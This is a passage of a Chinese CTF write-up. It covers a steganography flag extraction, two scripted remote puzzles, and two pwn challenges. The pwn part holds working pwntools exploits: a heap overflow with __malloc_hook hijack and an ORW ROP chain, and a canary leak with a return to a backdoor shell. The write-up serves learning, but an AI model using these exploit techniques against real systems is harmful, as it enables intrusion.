    #     """
    #     l = 10000 # binary message length
    #     delta = 20 # quantization step
    #     qim = QIM(delta)
    #     while True:
    #         x = np.random.randint(0, 255, l).astype(float) # host sample
    #         msg = qim.random_msg(l)
    #         y = qim.embed(x, msg)
    #         z_detected, msg_detected = qim.detect(y)
    #         print(x)
    #         print(y)
    #         print(z_detected)
    #         print(msg)
    #         print(msg_detected)
    #         assert np.allclose(msg, msg_detected) # compare the original and detected messages
    #         assert np.allclose(y, z_detected)     # compare the original and detected vectors
    def my_test_qim():
        delta = 20
        qim = QIM(delta)
        y = cv2.imread('/Users/lizihan/Downloads/ezSteganography-flag.png')
        z_detected, msg_detected = qim.detect(y)
        for i in tqdm(range(len(msg_detected))):
            for j in range(len(msg_detected[i])):
                for k in range(len(msg_detected[i][j])):
                    if msg_detected[i][j][k] == 1:
                        msg_detected[i][j][k] = 255
        cv2.imwrite('flag3.png', msg_detected)
    def main():
        my_test_qim()
    if __name__ == "__main__":
        sys.exit(main())
flag{2e9ec6480d05150c211963984dcbc9f1}
###  red_vs_blue
手动发现规律刚开始就设定好了，所以采用爆破思想即可，已知的规律都存入一个列表中，重开的时候直接输入列表里存放的结果，下一个如果尝试失败就换相反的队伍
exp如下：
    from pwn import*
    import random
    context(os='linux',arch='amd64',log_level='debug')
    p = remote("node4.buuoj.cn", 26828)
    my_list = [] 
    for i in range(66):
        my_list.append('0')
    count = 0
    flag = 1
    while True:
        text = p.recvline()
        if text == "Sorry!You are wrong!\n":
            flag += 1
            p.sendline('y')
            count = 0
        if text == "choose one [r] Red Team,[b] Blue Team:\n":
            if my_list[count] == 'r':
                p.sendline('r')
                count += 1
            elif my_list[count] == 'b':
                p.sendline('b')
                count += 1
            else:
                if flag % 2 == 1:
                    num = 'r'
                    p.sendline('r')
                    p.recvline()
                    text = p.recvline()
                    if text == "The result Red Team\n":
                        my_list[count] = num
                        log.info(''.join(i for i in my_list))
                        count += 1
                if flag % 2 == 0:
                    num = 'b' 
                    p.sendline('b')
                    p.recvline()
                    text = p.recvline()
                    if text == "The result Blue Team\n":
                        my_list[count] = num
                        log.info(''.join(i for i in my_list))
                        count += 1
###  funny_maze
在CSDN搜到一个python自动走迷宫的脚本[https://blog.csdn.net/qq_29681777/article/details/83719680，稍微把它的修改修改即可](https://blog.csdn.net/qq_29681777/article/details/83719680%EF%BC%8C%E7%A8%8D%E5%BE%AE%E6%8A%8A%E5%AE%83%E7%9A%84%E4%BF%AE%E6%94%B9%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF)
exp如下：
    # coding=utf-8
    from pwn import *
    context(os='linux',arch='amd64',log_level='debug')
    p = remote("node4.buuoj.cn",27665)
    dirs=[(0,1),(1,0),(0,-1),(-1,0)] #当前位置四个方向的偏移量
    path = []              #存找到的路径
    def mark(maze,pos):  #给迷宫maze的位置pos标"2"表示“倒过了”
        maze[pos[0]][pos[1]]=2
    def passable(maze,pos): #检查迷宫maze的位置pos是否可通行
        return maze[pos[0]][pos[1]]==0
    def find_path(maze, pos, end):
        mark(maze,pos)
        if pos==end:
            path.append(pos)
            return True
        for i in range(4):      #否则按四个方向顺序检查
            nextp=pos[0]+dirs[i][0],pos[1]+dirs[i][1]
            #考虑下一个可能方向
            if passable(maze,nextp):        #不可行的相邻位置不管
                if find_path(maze,nextp,end):#如果从nextp可达出口，输出这个位置，成功结束
                    path.append(pos)
                    return True
        return False
    def pwn():
        if count > 0:
            p.recvline()
            p.recvline()
            p.recvline()
        text = p.recvline()
        length = len(text) - 1  # '\n'占了一位
        maze = []
        maze.append([1] * length)
        for i in range(length - 1):  # 前面已经接收了第一行了
            text = p.recvline()
            maze1 = []
            for j in range(len(text) - 1):
                if text[j] == '#':
                    maze1.append(1)
                elif text[j] == ' ':
                    maze1.append(0)
                elif text[j] == 'S':
                    maze1.append(1)
                    start = (i + 1, j + 1)
                elif text[j] == 'E':
                    maze1.append(1)
                    end = (i + 1, j - 1)
            maze.append(maze1)
        find_path(maze,start,end)
        p.sendlineafter('Please enter your answer:\n', str(len(path) + 2))
    if __name__ == '__main__':
        p.sendlineafter('3.Introduction to this game\n', '1')
        count = 0
        while True:
            pwn()
            path = []
            count += 1
## PWN
###  Easyheap
程序使用strdup函数来malloc，它会根据你实际输入的内容大小来进行malloc，但是程序在add时同样需要输入size，并且将size写到了一个size数组中。之后在edit中发现，edit写入时，程序查看的是size数组中的大小。
所以我们add时输入大size，但写入少许内容，之后再edit这个chunk，就可以进行随意溢出。
首先利用extend去free一个unsortedbin，之后申请chunk，进行切片，使libc落到被覆盖的chunk里，打印libc_base。此时这个chunk同时处于allocate和free态，将它申请回来，可以double
free泄露heap_base。
之后劫持malloc_hook，动调后，写入gadget add rsp 0x38 ；ret，栈上rop进行orw获取flag
    from pwn import *
    context(os='linux',arch='amd64',log_level='debug')
    #p = process('./Easyheap')
    #libc = ELF('/home/hacker/glibc-all-in-one/libs/2.30-0ubuntu2_amd64/libc-2.30.so')
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    p = remote("node4.buuoj.cn",28436)
    #libc = ELF('/home/hacker/Desktop/libc/amd64/libc-2.30.so')
    elf = ELF('./Easyheap')
    def add(size,content):
        p.sendlineafter(">> :\n",'1')
        p.sendlineafter("Size: \n",str(int(size)))
        p.sendlineafter("Content: \n",content)
    def edit(idx,content):
        p.sendlineafter(">> :\n",'4')
        p.sendlineafter("Index:\n",str(idx))
        p.sendafter("Content:\n",content)
    def show(idx):
        p.sendlineafter(">> :\n",'3')
        p.sendlineafter("Index:\n",str(idx))
    def free(idx):
        p.sendlineafter(">> :\n",'2')
        p.sendlineafter("Index:\n",str(idx))
    add(0x30,"/flag".ljust(0x10,'a'))#0
    add(0x500,'a'*0x4d0)
    add(0x10,'a'*0x10)
    add(0x20,'a'*0x20)#3
    edit(0,'b'*0x10+p64(0)+p64(0x501))
    free(1)
    add(0x4d0,'c'*0x4d0)#1
    show(2)
    p.recvuntil("Content: ")
    libc_base = u64(p.recv(6).ljust(8,'\x00'))-96-0x10-libc.sym["__malloc_hook"]
    log.info("libc_base="+hex(libc_base))
    add(0x10,'a'*0x10)#4 = 2 double free
    add(0x10,'a'*0x10)
    add(0x30,"/flag\x00".ljust(0x30,'a'))#6
    free(5)
    free(2)
    show(4)
    p.recvuntil("Content: ")
    heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x7b0
    log.info("heap_base="+hex(heap_base))
    flag_addr = heap_base+0x7d0
    log.info("flag_addr="+hex(flag_addr))
    add(0x10,'a'*0x10)#2
    add(0x10,'a'*0x10)#5
    add(0x50,'a'*0x20)#7
    add(0x10,'a'*0x10)#8
    free(8)
    edit(7,'a'*0x20+p64(0)+p64(0x21)+p64(libc_base+libc.sym["__malloc_hook"]))
    add(0x10,'a'*0x10)#9
    pop_rdi = libc_base+0x215bf
    pop_rsi = libc_base+0x23eea
    pop_rdx = libc_base+0x1b96
    pop_rax = libc_base+0x43ae8
    syscall = libc_base+0x13c0
    gadget = libc_base+0xe0c4d #0x38
    #open(flag_addr,0)
    rop_chains = p64(pop_rdi)+p64(flag_addr)
    rop_chains+= p64(pop_rsi)+p64(0)
    rop_chains+= p64(pop_rax)+p64(2)
    rop_chains+= p64(libc_base+libc.sym["open"])
    #read(3,flag_addr,0x30)
    rop_chains+= p64(pop_rdi)+p64(3)
    rop_chains+= p64(pop_rsi)+p64(flag_addr)
    rop_chains+= p64(pop_rdx)+p64(0x30)
    rop_chains+= p64(pop_rax)+p64(0)
    rop_chains+= p64(libc_base+libc.sym["read"])
    #write(1,flag_addr,0x30)
    rop_chains+= p64(pop_rdi)+p64(1)
    rop_chains+= p64(pop_rsi)+p64(flag_addr)
    rop_chains+= p64(pop_rdx)+p64(0x30)
    rop_chains+= p64(pop_rax)+p64(1)
    rop_chains+= p64(libc_base+libc.sym["write"])
    add(0x10,p64(gadget))#7   malloc hook
    #add(0x100,"a"*0x100)
    add(0x400,rop_chains)
    p.interactive()
###  old_thing
程序需要输入密码，加密后和一字符串s2比较，相同便可进入，而且给了后门，所以只需要login进去，就可以轻松getshell。在输入密码read的地方发现off
by
null，而且输入的s和比对的字符串s2在栈里物理相邻，所以输入0x20长度的密码，就可以截断s2，并且如果输入的s加密后最低位也为00的话，则可以绕过strcmp，成功login。
直接随机生成字符串进行爆破，下面是爆破脚本
    from pwn import * 
    from LibcSearcher import *
    import hashlib
    context(os='linux',arch='amd64',log_level='debug')
    #ms = remote("node3.buuoj.cn",25543)
    elf = ELF("./canary3")
    def generate_char_id():
        m2 = hashlib.md5()
        m2.update(str(time.time()).encode('utf-8'))
        return m2.hexdigest()
    while True:
        ms = process("./canary3")
        ms.sendafter("please input username: ","admin")
        payload = generate_char_id()
        ms.sendafter("please input password: ",payload)
        if(ms.recvline()=="Login Fail\n"):
            continue
        else:
            break
得到密码：aeedc57231ad54641b5ecb7faa0479c8
之后进入程序，getshell
    from pwn import * 
    from LibcSearcher import *
    context(os='linux',arch='amd64',log_level='debug')
    p = remote("node4.buuoj.cn",26096)
    elf = ELF("./canary3")
    #p = process("./canary3")
    p.sendafter("please input username: ","admin")
    payload = "aeedc57231ad54641b5ecb7faa0479c8"
    p.sendafter("please input password: ",payload)
    p.sendlineafter("3.exit\n",'2')
    p.sendafter("your input:\n",'a'*(0x20-0x8)+'x')
    p.sendlineafter("3.exit\n",'1')
    p.recvuntil('x')
    canary = u64(ms.recv(7)[0:7].rjust(8,'\x00'))
    log.info("canary="+hex(canary))
    base = u64(ms.recv(6).ljust(8,'\x00'))-0x2530
    log.info("base="+hex(base))
    addr = base+0x239f
    p.sendlineafter("3.exit\n",'2')
    payload = 'a'*(0x20-0x8)+p64(canary)+p64(0)+p64(addr)
    p.sendafter("your input:\n",payload)
    p.sendlineafter("3.exit\n",'3')
    p.interactive()